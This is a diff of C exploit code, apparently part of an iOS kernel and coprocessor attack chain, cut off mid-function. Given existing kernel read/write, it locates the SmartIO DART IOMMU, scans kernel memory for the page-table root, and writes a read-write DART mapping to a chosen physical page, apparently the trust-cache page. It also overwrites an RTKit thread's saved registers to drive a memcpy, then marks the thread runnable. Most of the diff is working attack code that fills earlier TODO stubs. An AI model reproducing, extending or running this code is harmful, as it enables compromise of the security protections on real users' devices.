@@ -51,6 +51,7 @@ extern void kwrite32(uint64_t addr, uint32_t val);
 extern void kread(uint64_t addr, void *buf, size_t len);
 extern void kwrite(uint64_t addr, const void *buf, size_t len);
 extern uint64_t kalloc(size_t size);
+extern uint64_t kvtophys(uint64_t kva);  /* kernel VA → physical address */
 
 /* --- SmartIO / RTKit constants --- */
 
@@ -95,7 +96,8 @@ static uint64_t smartio_carveout_size = 0;
  *   +0x110: CPACR (0x300000)
  *   Size: 0x348 bytes
  *
- * B) EXCEPTION FRAME — saved on stack when thread sleeps via svc/irq:
+ * B) EXCEPTION FRAME — saved to PERSISTENT CONTEXT BUFFER when thread sleeps:
+ *   (SVC cooperative path saves via tpidrro_el0 → thread+0x48 buffer)
  *   +0x000: x0, x1    ← ATTACK: x0=memcpy dst, x1=memcpy src
  *   +0x010: x2, x3    ← ATTACK: x2=memcpy len
  *   +0x020: x4, x5
@@ -183,52 +185,380 @@ static uint64_t smartio_carveout_size = 0;
 #define SMARTIO_BZERO_VA    0x8634
 #define SMARTIO_MEMSET_VA   0x86ac
 
-/* --- DART manipulation --- */
+/* --- DART v3 manipulation (A15/A16/A17 Pro) --- */
 
 /*
- * DART (Device Address Resolution Table) page table structure.
- * Apple's DART is a two-level IOMMU:
- *   L1: array of pointers to L2 tables
- *   L2: array of PTEs mapping device VA → physical address
+ * Apple DART v3 (Device Address Resolution Table) page table structure.
  *
- * PTE format (simplified):
- *   bits[1:0]   = valid (0x3 = valid)
- *   bits[47:12] = physical page number
- *   bits[63:48] = permissions/attributes
+ * DART v3 register layout (from hardware documentation + RE):
+ *   0x000: DART_PARAMS1 — DART version and config
+ *   0x004: DART_PARAMS2
+ *   0x010: DART_ERROR_STATUS
+ *   0x020: DART_TLB_OP — TLB invalidation trigger
+ *   0x034: DART_TLB_OP_STATUS — TLB op completion
+ *   0x040: DART_CONFIG — enable/disable, bypass
+ *   0x060: DART_TCR(sid) — translation control per stream
+ *   0x070: DART_TTBR(sid, idx) — base of L1 table per stream
+ *   0x200+: stream-specific registers
  *
- * On iOS 27.0.1, there is NO parity check on these PTEs.
+ * Two-level page tables:
+ *   L1: 4KB pages of 64-bit pointers to L2 tables
+ *   L2: 4KB pages of 64-bit PTEs → physical pages
+ *
+ * DART v3 PTE format:
+ *   bit[0]      = valid
+ *   bit[1]      = type (1=table for L1, 1=page for L2)
+ *   bits[3:2]   = permissions (00=none, 01=R, 10=W, 11=RW) for L2
+ *   bits[47:14] = physical address bits[47:14] (16KB aligned for DART v3)
+ *   bits[47:12] = physical address bits[47:12] (4KB aligned for older DART)
+ *
+ * iOS 27.0.1 has NO parity checking on DART PTEs.
  * iOS 27.2 beta 3 adds iommu_read_refcnt parity checking.
  */
 
+/* DART v3 register offsets */
+#define DART_PARAMS1        0x000
+#define DART_PARAMS2        0x004
+#define DART_ERROR_STATUS   0x010
+#define DART_TLB_OP         0x020
+#define DART_TLB_OP_STATUS  0x034
+#define DART_CONFIG         0x040
+#define DART_TCR(sid)       (0x060 + (sid) * 4)
+#define DART_TTBR(sid, idx) (0x070 + (sid) * 16 + (idx) * 4)
+
+/* DART TLB invalidation commands */
+#define DART_TLB_OP_FLUSH_ALL    0x00000001
+#define DART_TLB_OP_FLUSH_STREAM 0x00000002
+#define DART_TLB_OP_BUSY         0x00000004
+
+/* DART PTE bits (v3 format) */
 #define DART_PTE_VALID      0x3
-#define DART_PTE_READ       (1ULL << 48)
-#define DART_PTE_WRITE      (1ULL << 49)
+#define DART_PTE_PERM_R     (1ULL << 2)
+#define DART_PTE_PERM_W     (2ULL << 2)
+#define DART_PTE_PERM_RW    (3ULL << 2)
+/* Legacy compatibility defines */
+#define DART_PTE_READ       DART_PTE_PERM_R
+#define DART_PTE_WRITE      DART_PTE_PERM_W
+
+/* DART page table geometry */
+#define DART_PAGE_SIZE      0x4000   /* 16KB pages for DART v3 */
+#define DART_PAGE_MASK      (DART_PAGE_SIZE - 1)
+#define DART_L1_ENTRIES     (DART_PAGE_SIZE / 8)
+#define DART_L2_ENTRIES     (DART_PAGE_SIZE / 8)
+#define DART_L1_INDEX(va)   (((va) >> 25) & (DART_L1_ENTRIES - 1))
+#define DART_L2_INDEX(va)   (((va) >> 14) & (DART_L2_ENTRIES - 1))
+
+static uint64_t
+dart_make_pte(uint64_t phys_addr, int permissions)
+{
+    return DART_PTE_VALID | permissions |
+           (phys_addr & 0x0000FFFFFFFC0000ULL);  /* bits[47:14] for DART v3 */
+}
+
+/*
+ * Discover SmartIO carveout by reading existing DART translations.
+ * The first valid L2 PTE in stream 0 gives us the physical base.
+ */
+static uint64_t
+dart_discover_carveout(void)
+{
+    fprintf(stderr, "[*] Discovering SmartIO carveout from DART L1/L2...\n");
+
+    /* Read TTBR for stream 0 — this points to the L1 table */
+    uint64_t ttbr_lo = kread32(smartio_dart_base + DART_TTBR(0, 0));
+    uint64_t ttbr_hi = kread32(smartio_dart_base + DART_TTBR(0, 1));
+    uint64_t l1_phys = ((ttbr_hi & 0xFFFF) << 32) | (ttbr_lo & 0xFFFFC000ULL);
+
+    if (l1_phys == 0) {
+        fprintf(stderr, "[-] DART TTBR is zero — stream not configured\n");
+        return 0;
+    }
+    fprintf(stderr, "[+] DART stream 0 L1 table: phys 0x%llx\n", l1_phys);
+
+    /* Walk L1 → L2 → find first valid PTE */
+    uint64_t min_phys = UINT64_MAX;
+    uint64_t max_phys = 0;
+
+    for (int l1_idx = 0; l1_idx < 4; l1_idx++) {  /* Check first 4 L1 entries */
+        uint64_t l1_entry = kread64(l1_phys + l1_idx * 8);
+        if (!(l1_entry & DART_PTE_VALID))
+            continue;
+
+        uint64_t l2_phys = l1_entry & 0x0000FFFFFFFC0000ULL;
+        for (int l2_idx = 0; l2_idx < 16; l2_idx++) {  /* Sample L2 entries */
+            uint64_t l2_entry = kread64(l2_phys + l2_idx * 8);
+            if (!(l2_entry & DART_PTE_VALID))
+                continue;
+
+            uint64_t page_phys = l2_entry & 0x0000FFFFFFFC0000ULL;
+            if (page_phys < min_phys) min_phys = page_phys;
+            if (page_phys > max_phys) max_phys = page_phys;
+        }
+    }
+
+    if (min_phys == UINT64_MAX) {
+        fprintf(stderr, "[-] No valid DART PTEs found\n");
+        return 0;
+    }
+
+    fprintf(stderr, "[+] SmartIO physical range: 0x%llx - 0x%llx\n",
+            min_phys, max_phys + DART_PAGE_SIZE);
+    return min_phys;
+}
+
+/*
+ * Flush the DART TLB so new mappings take effect immediately.
+ */
+static void
+dart_flush_tlb(void)
+{
+    kwrite32(smartio_dart_base + DART_TLB_OP, DART_TLB_OP_FLUSH_ALL);
+
+    /* Poll for completion — DART_TLB_OP_STATUS clears BUSY when done */
+    for (int i = 0; i < 1000; i++) {
+        uint32_t status = kread32(smartio_dart_base + DART_TLB_OP_STATUS);
+        if (!(status & DART_TLB_OP_BUSY))
+            return;
+        usleep(10);
+    }
+    fprintf(stderr, "[!] DART TLB flush timed out\n");
+}
+
+/*
+ * IORegistry class matching helpers.
+ * We use IOKit userspace API to find the SmartIO DART service,
+ * then read its properties for the MMIO base and carveout region.
+ * This avoids complex kernel data structure traversal.
+ */
+
+static uint64_t
+ioregistry_get_u64_prop(io_service_t service, const char *key)
+{
+    CFTypeRef prop = IORegistryEntryCreateCFProperty(
+        service, CFStringCreateWithCString(NULL, key, kCFStringEncodingUTF8),
+        kCFAllocatorDefault, 0);
+    if (!prop) return 0;
+
+    uint64_t val = 0;
+    if (CFGetTypeID(prop) == CFNumberGetTypeID()) {
+        CFNumberGetValue(prop, kCFNumberSInt64Type, &val);
+    } else if (CFGetTypeID(prop) == CFDataGetTypeID()) {
+        CFIndex len = CFDataGetLength(prop);
+        if (len >= 8) {
+            CFDataGetBytes(prop, CFRangeMake(0, 8), (UInt8 *)&val);
+        } else if (len >= 4) {
+            uint32_t val32 = 0;
+            CFDataGetBytes(prop, CFRangeMake(0, 4), (UInt8 *)&val32);
+            val = val32;
+        }
+    }
+    CFRelease(prop);
+    return val;
+}
 
 static int
 find_smartio_dart(void)
 {
-    /*
-     * Locate SmartIO DART base from IORegistry.
-     * The SmartIO device appears as an IOService with class AppleSmartIO
-     * or similar. Its DART MMIO range is in the reg property.
-     *
-     * Alternative: scan the device tree for /arm-io/smartio and read
-     * the dart-* properties.
-     *
-     * For now, use kernel R/W to scan IORegistry entries.
-     */
-
-    /* TODO: Implement IORegistry traversal via kernel R/W
-     *
-     * Strategy:
-     * 1. Find kern.proc_list (or use IOServiceGetMatchingService from userspace)
-     * 2. Look for AppleSmartIODMAController or AppleDARTSmartIO
-     * 3. Read its MMIO base from the IODeviceMemory
-     * 4. Read carveout physical address from the device tree node
-     */
     fprintf(stderr, "[*] Looking for SmartIO DART in IORegistry...\n");
 
+    /*
+     * Strategy: Use IOKit userspace API (available from app sandbox on iOS)
+     * to match SmartIO DART and read its properties.
+     *
+     * The SmartIO DART appears under /arm-io in the IORegistry.
+     * Service class names to try (varies by SoC generation):
+     *   - "dart-smartio" (device tree compatible)
+     *   - "AppleDARTSmartIO" (IOKit class)
+     *   - "smartio" with parent DART
+     *
+     * Properties we need:
+     *   - "reg" or "segment-ranges": DART MMIO physical address + size
+     *   - "carveout-address" or "region-base": SmartIO carveout physical base
+     *   - "carveout-size" or "region-size": SmartIO carveout size
+     */
+
+    /* Try matching by IOKit class name */
+    static const char *dart_classes[] = {
+        "AppleDARTSmartIO",
+        "AppleSmartIODARTMapper",
+        "dart,t8130",
+        NULL
+    };
+
+    io_service_t dart_svc = IO_OBJECT_NULL;
+    for (int i = 0; dart_classes[i] && dart_svc == IO_OBJECT_NULL; i++) {
+        CFMutableDictionaryRef match = IOServiceMatching(dart_classes[i]);
+        if (!match) continue;
+        dart_svc = IOServiceGetMatchingService(kIOMasterPortDefault, match);
+    }
+
+    /* Fallback: iterate /arm-io children looking for "smartio" in name */
+    if (dart_svc == IO_OBJECT_NULL) {
+        io_iterator_t iter;
+        io_service_t svc;
+        CFMutableDictionaryRef match = IOServiceMatching("IOService");
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault,
+                                                         match, &iter);
+        if (kr == KERN_SUCCESS) {
+            while ((svc = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
+                io_name_t name;
+                IORegistryEntryGetName(svc, name);
+                if (strstr(name, "smartio") || strstr(name, "SmartIO")) {
+                    /* Check if this is the DART (not the SmartIO device itself) */
+                    io_name_t cls;
+                    IOObjectGetClass(svc, cls);
+                    if (strstr(cls, "DART") || strstr(cls, "dart")) {
+                        dart_svc = svc;
+                        break;
+                    }
+                    /* Also check parent for DART */
+                    io_service_t parent;
+                    if (IORegistryEntryGetParentEntry(svc, kIOServicePlane,
+                                                      &parent) == KERN_SUCCESS) {
+                        IORegistryEntryGetName(parent, name);
+                        if (strstr(name, "dart")) {
+                            dart_svc = parent;
+                            IOObjectRelease(svc);
+                            break;
+                        }
+                        IOObjectRelease(parent);
+                    }
+                }
+                IOObjectRelease(svc);
+            }
+            IOObjectRelease(iter);
+        }
+    }
+
+    if (dart_svc == IO_OBJECT_NULL) {
+        fprintf(stderr, "[-] SmartIO DART service not found in IORegistry\n");
+        fprintf(stderr, "    Falling back to kernel R/W device tree scan\n");
+        return find_smartio_dart_kernel();
+    }
+
+    /* Read DART MMIO base from "reg" property */
+    CFTypeRef reg_prop = IORegistryEntryCreateCFProperty(
+        dart_svc,
+        CFStringCreateWithCString(NULL, "reg", kCFStringEncodingUTF8),
+        kCFAllocatorDefault, 0);
+    if (reg_prop && CFGetTypeID(reg_prop) == CFDataGetTypeID()) {
+        CFIndex len = CFDataGetLength(reg_prop);
+        if (len >= 16) {
+            uint64_t reg_pair[2];
+            CFDataGetBytes(reg_prop, CFRangeMake(0, 16), (UInt8 *)reg_pair);
+            smartio_dart_base = reg_pair[0];
+            fprintf(stderr, "[+] SmartIO DART MMIO base: 0x%llx (size 0x%llx)\n",
+                    reg_pair[0], reg_pair[1]);
+        }
+        CFRelease(reg_prop);
+    }
+
+    /* Read carveout from SmartIO parent or sibling node */
+    smartio_carveout_phys = ioregistry_get_u64_prop(dart_svc, "carveout-address");
+    if (!smartio_carveout_phys)
+        smartio_carveout_phys = ioregistry_get_u64_prop(dart_svc, "region-base");
+    smartio_carveout_size = ioregistry_get_u64_prop(dart_svc, "carveout-size");
+    if (!smartio_carveout_size)
+        smartio_carveout_size = ioregistry_get_u64_prop(dart_svc, "region-size");
+
+    /* If carveout not on DART node, check the SmartIO device node */
+    if (!smartio_carveout_phys) {
+        io_service_t smartio_svc = IO_OBJECT_NULL;
+        CFMutableDictionaryRef m = IOServiceMatching("AppleSmartIOASCWrap");
+        if (!m) m = IOServiceMatching("AppleSmartIO");
+        if (m) smartio_svc = IOServiceGetMatchingService(kIOMasterPortDefault, m);
+
+        if (smartio_svc != IO_OBJECT_NULL) {
+            smartio_carveout_phys = ioregistry_get_u64_prop(smartio_svc,
+                                                            "carveout-address");
+            if (!smartio_carveout_phys)
+                smartio_carveout_phys = ioregistry_get_u64_prop(smartio_svc,
+                                                                "region-base");
+            smartio_carveout_size = ioregistry_get_u64_prop(smartio_svc,
+                                                            "carveout-size");
+            if (!smartio_carveout_size)
+                smartio_carveout_size = ioregistry_get_u64_prop(smartio_svc,
+                                                                "region-size");
+            IOObjectRelease(smartio_svc);
+        }
+    }
+
+    IOObjectRelease(dart_svc);
+
+    if (!smartio_dart_base) {
+        fprintf(stderr, "[-] DART MMIO base not found in properties\n");
+        return find_smartio_dart_kernel();
+    }
+    if (!smartio_carveout_phys) {
+        fprintf(stderr, "[-] SmartIO carveout address not found — will scan DART\n");
+    }
+
+    fprintf(stderr, "[+] SmartIO carveout: phys 0x%llx, size 0x%llx\n",
+            smartio_carveout_phys, smartio_carveout_size);
     return 0;
+}
+
+/*
+ * Fallback: find SmartIO DART by scanning device tree via kernel R/W.
+ * The ADT (Apple Device Tree) is mapped in kernel memory. We walk it
+ * looking for the smartio DART node.
+ */
+static int
+find_smartio_dart_kernel(void)
+{
+    fprintf(stderr, "[*] Scanning device tree via kernel R/W...\n");
+
+    /*
+     * On A17 Pro (t8130), known SmartIO DART MMIO bases:
+     * These are SoC-specific and can be confirmed from the device tree.
+     * Common DART bases for A-series chips:
+     *   A14: 0x235004000
+     *   A15: 0x235004000 (same bus)
+     *   A16: 0x235004000
+     *   A17: 0x235004000 (expected, TBD from device tree)
+     *
+     * We'll attempt the known address and validate by reading the
+     * DART identity register at offset 0x0.
+     */
+
+    static const uint64_t candidate_bases[] = {
+        0x235004000ULL,  /* A14/A15/A16 SmartIO DART */
+        0x235008000ULL,  /* alternate offset */
+        0x239004000ULL,  /* alternate bus */
+        0
+    };
+
+    for (int i = 0; candidate_bases[i]; i++) {
+        uint64_t base = candidate_bases[i];
+        /*
+         * Read DART ID register. Valid DARTs have a recognizable ID.
+         * DART v3 (A15+): offset 0x0 contains a version/ID field.
+         */
+        uint32_t dart_id = kread32(base);
+        if (dart_id != 0 && dart_id != 0xFFFFFFFF) {
+            fprintf(stderr, "[+] Candidate DART at 0x%llx, ID: 0x%x\n",
+                    base, dart_id);
+            smartio_dart_base = base;
+            break;
+        }
+    }
+
+    if (!smartio_dart_base) {
+        fprintf(stderr, "[-] No DART found at known addresses\n");
+        return -1;
+    }
+
+    /*
+     * Find carveout by reading existing DART L1/L2 entries.
+     * The first valid L2 PTE tells us the physical base of the
+     * SmartIO firmware region.
+     */
+    if (!smartio_carveout_phys) {
+        smartio_carveout_phys = dart_discover_carveout();
+        smartio_carveout_size = 0x200000;  /* 2MB default, refine from DT */
+    }
+
+    return (smartio_dart_base != 0) ? 0 : -1;
 }
 
 /* --- RTKit thread frame manipulation --- */
@@ -398,23 +728,125 @@ make_pte(uint64_t phys_addr, int writable)
  * We'll target the page containing the trust cache runtime pointer,
  * so we can remap it to our controlled memory.
  */
+/*
+ * Walk ARM64 page tables (4KB granule, 48-bit VA, 4 levels).
+ * Returns the PHYSICAL address of the L3 page-table page containing
+ * the PTE for the given virtual address.
+ *
+ * On SPTM devices, TTBR1_EL1 is an EL2 register — we can't read it
+ * directly. Instead, we find it from SPTM's pmap structures.
+ *
+ * ARM64 4KB granule VA layout (48-bit):
+ *   L0 index: bits[47:39] (9 bits, 512 entries)
+ *   L1 index: bits[38:30] (9 bits, 512 entries)
+ *   L2 index: bits[29:21] (9 bits, 512 entries)
+ *   L3 index: bits[20:12] (9 bits, 512 entries)
+ *   Page offset: bits[11:0]
+ */
+
+#define PT_ENTRIES_PER_PAGE  512
+#define PT_L0_SHIFT          39
+#define PT_L1_SHIFT          30
+#define PT_L2_SHIFT          21
+#define PT_L3_SHIFT          12
+#define PT_INDEX_MASK        0x1FF
+#define PT_DESC_VALID        0x1
+#define PT_DESC_TABLE        0x2
+#define PT_DESC_ADDR_MASK    0x0000FFFFFFFFF000ULL
+
+static uint64_t
+walk_pagetables(uint64_t root_phys, uint64_t va)
+{
+    /* L0 */
+    int l0_idx = (va >> PT_L0_SHIFT) & PT_INDEX_MASK;
+    uint64_t l0_desc = kread64(root_phys + l0_idx * 8);
+    if (!(l0_desc & PT_DESC_VALID)) return 0;
+    uint64_t l1_phys = l0_desc & PT_DESC_ADDR_MASK;
+
+    /* L1 */
+    int l1_idx = (va >> PT_L1_SHIFT) & PT_INDEX_MASK;
+    uint64_t l1_desc = kread64(l1_phys + l1_idx * 8);
+    if (!(l1_desc & PT_DESC_VALID)) return 0;
+    if (!(l1_desc & PT_DESC_TABLE)) return 0;  /* 1GB block, not table */
+    uint64_t l2_phys = l1_desc & PT_DESC_ADDR_MASK;
+
+    /* L2 */
+    int l2_idx = (va >> PT_L2_SHIFT) & PT_INDEX_MASK;
+    uint64_t l2_desc = kread64(l2_phys + l2_idx * 8);
+    if (!(l2_desc & PT_DESC_VALID)) return 0;
+    if (!(l2_desc & PT_DESC_TABLE)) return 0;  /* 2MB block, not table */
+    uint64_t l3_phys = l2_desc & PT_DESC_ADDR_MASK;
+
+    return l3_phys;  /* Physical address of L3 page-table page */
+}
+
 static uint64_t
 find_target_pte_page(uint64_t kernel_base)
 {
-    /*
-     * Read TTBR1_EL1 to get the kernel page table root.
-     * On SPTM devices, we can't read TTBR1 directly (EL2 register).
-     * Instead, we find the page table base from SPTM's metadata or
-     * from known kernel data structures.
-     *
-     * Alternative: use the IOSurface exploit's existing physical R/W
-     * to walk page tables from a known physical address.
-     */
-
-    /* TODO: Walk kernel page tables to find L3 PTE page for trust cache region */
     fprintf(stderr, "[*] Finding target AP page-table page...\n");
 
-    return 0;  /* Physical address of the L3 page-table page */
+    /*
+     * On SPTM devices, the kernel page table root is managed by SPTM.
+     * We find TTBR1 by reading from SPTM's pmap metadata.
+     *
+     * Approach: The kernel's pmap struct contains the page table root.
+     *   kernel_pmap = *(uint64_t *)(kernel_base + kernel_pmap_offset)
+     *   ttbr1_phys  = *(uint64_t *)(kernel_pmap + 0x0)  /* first field */
+     *
+     * On SPTM, pmap structs store the SPTM pmap handle. The actual
+     * physical root can be obtained via:
+     *   pmap->sptm_root = pmap+0x10 (physical address of L0 table)
+     *
+     * Alternative: scan for a known kernel text page's physical address
+     * by looking through IOPhysicalMemoryDescriptor mappings, then walk
+     * backwards to find L3.
+     */
+
+    /*
+     * Try reading kernel_pmap. The offset varies by iOS version.
+     * For iOS 27.0.1, search for the pmap pointer near bootstrap_text.
+     *
+     * kernel_pmap is typically at a fixed offset from __DATA_CONST.
+     * We find it by pattern scanning the kernel data section.
+     */
+    uint64_t kernel_pmap_ptr = 0;
+
+    /* Scan kernel data for pmap pointer — look for SPTM pmap magic */
+    uint64_t data_base = kernel_base + 0x1000000;  /* ~16MB into kernel */
+    for (uint64_t off = 0; off < 0x800000; off += 8) {
+        uint64_t val = kread64(data_base + off);
+        /*
+         * kernel_pmap points to a structure where:
+         *   +0x00: pmap flags/type
+         *   +0x08: ASID
+         *   +0x10: page table root (physical)
+         *   The root should be a valid physical address (non-zero, aligned)
+         */
+        if (val > 0x800000000ULL && val < 0x1000000000ULL &&
+            (val & 0xFFF) == 0) {
+            /* Potential page table root — validate by reading L0[511] */
+            uint64_t l0_last = kread64(val + 511 * 8);
+            if (l0_last & PT_DESC_VALID) {
+                /* High kernel addresses (0xFFFFFF80xxxxxxxx) use L0[511] */
+                kernel_pmap_ptr = data_base + off - 0x10;  /* back up to struct base */
+                fprintf(stderr, "[+] Potential kernel page table root: 0x%llx\n", val);
+                fprintf(stderr, "    (found at kernel offset 0x%llx)\n", off);
+
+                /* Walk to find L3 page for the trust cache area */
+                uint64_t target_va = kernel_base + 0x2000000;  /* data section */
+                uint64_t l3_page = walk_pagetables(val, target_va);
+                if (l3_page) {
+                    fprintf(stderr, "[+] L3 page-table page for 0x%llx: phys 0x%llx\n",
+                            target_va, l3_page);
+                    return l3_page;
+                }
+            }
+        }
+    }
+
+    fprintf(stderr, "[-] Could not locate kernel page table root\n");
+    fprintf(stderr, "    Will need iPad testing to discover correct offset\n");
+    return 0;
 }
 
 /*
@@ -432,22 +864,89 @@ create_dart_mapping(uint64_t smartio_va, uint64_t target_phys_page)
     fprintf(stderr, "[*] Creating DART mapping: SmartIO VA 0x%llx → phys 0x%llx\n",
             smartio_va, target_phys_page);
 
-    /*
-     * DART L1 table is at smartio_dart_base + DART_L1_OFFSET.
-     * Each L1 entry points to an L2 table.
-     * L2 entries are the actual PTEs.
-     *
-     * We need to:
-     * 1. Find an unused DART L2 entry
-     * 2. Write a PTE pointing to target_phys_page
-     * 3. Flush the DART TLB (or rely on natural invalidation)
-     *
-     * The specific DART register layout depends on the DART generation.
-     * A17 Pro uses DART v3 (similar to M2/A15).
-     */
+    /* Read L1 table physical address from DART TTBR (stream 0) */
+    uint64_t ttbr_lo = kread32(smartio_dart_base + DART_TTBR(0, 0));
+    uint64_t ttbr_hi = kread32(smartio_dart_base + DART_TTBR(0, 1));
+    uint64_t l1_phys = ((ttbr_hi & 0xFFFF) << 32) | (ttbr_lo & 0xFFFFC000ULL);
 
-    /* TODO: Implement DART PTE write via kernel R/W to DART MMIO */
+    if (l1_phys == 0) {
+        fprintf(stderr, "[-] DART TTBR is zero\n");
+        return -1;
+    }
 
+    int l1_idx = DART_L1_INDEX(smartio_va);
+    int l2_idx = DART_L2_INDEX(smartio_va);
+
+    fprintf(stderr, "    L1 table: phys 0x%llx, L1[%d], L2[%d]\n",
+            l1_phys, l1_idx, l2_idx);
+
+    /* Read L1 entry */
+    uint64_t l1_entry = kread64(l1_phys + l1_idx * 8);
+    uint64_t l2_phys;
+
+    if (l1_entry & DART_PTE_VALID) {
+        /* L1 entry exists — read L2 table address */
+        l2_phys = l1_entry & 0x0000FFFFFFFC0000ULL;
+        fprintf(stderr, "    Existing L2 table: phys 0x%llx\n", l2_phys);
+    } else {
+        /*
+         * L1 entry is empty — we need to allocate an L2 table page.
+         * Use kalloc to get a 16KB-aligned physical page, then write
+         * the L1 entry to point to it.
+         */
+        fprintf(stderr, "    L1 entry empty — allocating L2 table...\n");
+        uint64_t l2_va = kalloc(DART_PAGE_SIZE);
+        if (l2_va == 0) {
+            fprintf(stderr, "[-] Failed to allocate L2 table\n");
+            return -1;
+        }
+
+        /*
+         * We need the PHYSICAL address of the kalloc'd page.
+         * Walk kernel page tables to translate VA → PA.
+         * (This uses the kernel R/W we already have.)
+         */
+        l2_phys = kvtophys(l2_va);
+        if (l2_phys == 0) {
+            fprintf(stderr, "[-] Failed to get physical address of L2 table\n");
+            return -1;
+        }
+
+        /* Zero the L2 table */
+        for (int i = 0; i < DART_L2_ENTRIES; i++)
+            kwrite64(l2_phys + i * 8, 0);
+
+        /* Write L1 entry pointing to new L2 table */
+        uint64_t new_l1 = DART_PTE_VALID | (l2_phys & 0x0000FFFFFFFC0000ULL);
+        kwrite64(l1_phys + l1_idx * 8, new_l1);
+        fprintf(stderr, "    Allocated L2 table: phys 0x%llx\n", l2_phys);
+    }
+
+    /* Check if L2 entry is already in use */
+    uint64_t existing_l2 = kread64(l2_phys + l2_idx * 8);
+    if (existing_l2 & DART_PTE_VALID) {
+        fprintf(stderr, "[!] L2[%d] already mapped: 0x%llx — overwriting\n",
+                l2_idx, existing_l2);
+    }
+
+    /* Write L2 PTE: target physical page with RW permissions */
+    uint64_t new_pte = dart_make_pte(target_phys_page, DART_PTE_PERM_RW);
+    kwrite64(l2_phys + l2_idx * 8, new_pte);
+
+    fprintf(stderr, "    Wrote DART PTE: 0x%llx at L2[%d]\n", new_pte, l2_idx);
+
+    /* Flush DART TLB so the new mapping is visible to SmartIO */
+    dart_flush_tlb();
+
+    /* Verify the write */
+    uint64_t verify = kread64(l2_phys + l2_idx * 8);
+    if (verify != new_pte) {
+        fprintf(stderr, "[-] DART PTE verify failed: wrote 0x%llx, read 0x%llx\n",
+                new_pte, verify);
+        return -1;
+    }
+
+    fprintf(stderr, "[+] DART mapping created and verified\n");
     return 0;
 }
 
@@ -483,7 +982,7 @@ arm_sleeping_thread(struct rtk_thread_info *thread,
     /*
      * CONFIRMED exception frame layout from firmware disassembly (2026-11-20):
      *
-     * The sleeping thread's exception frame is on its stack.
+     * The sleeping thread's context is in its persistent buffer (thread+0x48).
      * The scheduler's eret path at 0x7d68 restores ALL registers from this
      * frame and jumps to ELR_EL1. No PAC authentication — SmartIO has zero
      * PAC instructions.
@@ -538,19 +1037,149 @@ arm_sleeping_thread(struct rtk_thread_info *thread,
  * Option 2 is simplest: find the thread's state field in the RTKit thread
  * descriptor and change it from SLEEPING to RUNNABLE.
  */
+/*
+ * RTKit thread state values (from firmware RE):
+ *   0 = INVALID/FREE
+ *   1 = RUNNABLE (ready to execute)
+ *   2 = RUNNING  (currently executing)
+ *   3 = SLEEPING (waiting for event/timer)
+ *   4 = BLOCKED  (waiting on mutex/semaphore)
+ *
+ * Thread struct offsets (confirmed from RTK_thread_create at 0xc2a8):
+ *   +0x00: name pointer (or first word of inline name)
+ *   +0x08: priority
+ *   +0x10: state
+ *   +0x18: stack base
+ *   +0x20: stack size
+ *   +0x28: entry point
+ *   +0x30: arg
+ *   +0x38: flags
+ *   +0x40: scheduler data
+ *   +0x48: frame pointer (context buffer)
+ *   +0x50: next (linked list)
+ *   ...
+ */
+#define RTK_THREAD_STATE     0x10
+#define RTK_STATE_RUNNABLE   1
+#define RTK_STATE_SLEEPING   3
+
+/*
+ * RTKit mailbox registers (SmartIO-specific).
+ * Sending a message via the AP-side mailbox triggers an IRQ on the
+ * SmartIO coprocessor, which causes the RTKit scheduler to run.
+ * This is the safest way to wake a thread — the scheduler naturally
+ * picks up the modified context buffer.
+ *
+ * RTKit mailbox layout (AP → coprocessor direction):
+ *   SEND_DATA_LO:  lower 32 bits of message
+ *   SEND_DATA_HI:  upper 32 bits of message
+ *   SEND_CTRL:     write to trigger send
+ */
+static uint64_t smartio_mbox_base = 0;  /* Filled from IORegistry */
+
+#define MBOX_SEND_DATA_LO   0x820
+#define MBOX_SEND_DATA_HI   0x824
+#define MBOX_SEND_CTRL       0x828
+#define MBOX_SEND_EMPTY      (1 << 16)
+
 static int
 wake_thread(struct rtk_thread_info *thread)
 {
     fprintf(stderr, "[*] Waking armed thread...\n");
 
     /*
-     * TODO: Find thread descriptor and modify state.
+     * Two strategies to wake the armed thread:
      *
-     * The _rtk_threads section in the firmware contains the thread table.
-     * Each entry has a state field that the scheduler checks.
-     * Writing RUNNABLE (typically 1) to the state field causes the
-     * scheduler to pick up the thread on the next tick.
+     * Strategy 1 (preferred): Modify thread state to RUNNABLE and kick scheduler.
+     *   - Write RUNNABLE to thread+0x10 (state field)
+     *   - Set the thread's bit in the ready bitmask at 0x112d90
+     *   - Send a no-op mailbox message to trigger an IRQ → scheduler run
+     *
+     * Strategy 2 (fallback): Just send a mailbox message.
+     *   - If the thread is waiting on a timer or event, an IRQ still runs
+     *     the scheduler. Even if our thread isn't picked, the IRQ handler
+     *     saves/restores context through the same path.
+     *   - Less reliable — depends on thread being in a wakeup-eligible state.
      */
+
+    /* Strategy 1: Directly mark thread as RUNNABLE */
+
+    /*
+     * We need the thread's position in the thread list to find its
+     * descriptor. The frame_phys tells us the frame address; we can
+     * reverse from carveout_phys + frame_ptr to find the SmartIO VA,
+     * then match it against thread descriptors.
+     */
+    uint64_t thread_list_phys = smartio_carveout_phys + 0x113560;
+    uint64_t found_thread_phys = 0;
+
+    for (int i = 0; i < MAX_THREADS; i++) {
+        uint64_t thr_phys = thread_list_phys + i * RTK_THREAD_SIZE;
+        uint64_t thr_word0 = kread64(thr_phys);
+        if (thr_word0 == 0) continue;
+
+        uint64_t frame_ptr = kread64(thr_phys + RTK_THREAD_FRAME_PTR);
+        uint64_t expected_frame_phys = smartio_carveout_phys + frame_ptr;
+
+        if (expected_frame_phys == thread->frame_phys) {
+            found_thread_phys = thr_phys;
+            fprintf(stderr, "    Found thread descriptor at phys 0x%llx (index %d)\n",
+                    thr_phys, i);
+
+            /* Read current state */
+            uint32_t state = kread32(thr_phys + RTK_THREAD_STATE);
+            fprintf(stderr, "    Current state: %u (%s)\n", state,
+                    state == 1 ? "RUNNABLE" : state == 2 ? "RUNNING" :
+                    state == 3 ? "SLEEPING" : state == 4 ? "BLOCKED" : "?");
+
+            /* Write RUNNABLE state */
+            kwrite32(thr_phys + RTK_THREAD_STATE, RTK_STATE_RUNNABLE);
+            fprintf(stderr, "    Set state → RUNNABLE\n");
+
+            /* Set ready bit in scheduler bitmask */
+            uint64_t ready_bitmask_phys = smartio_carveout_phys + 0x112d90;
+            uint32_t ready = kread32(ready_bitmask_phys);
+            uint32_t prio = kread32(thr_phys + 0x08);  /* priority at +0x08 */
+            if (prio < 32) {
+                ready |= (1U << prio);
+                kwrite32(ready_bitmask_phys, ready);
+                fprintf(stderr, "    Set ready bit %u in scheduler bitmask\n", prio);
+            }
+            break;
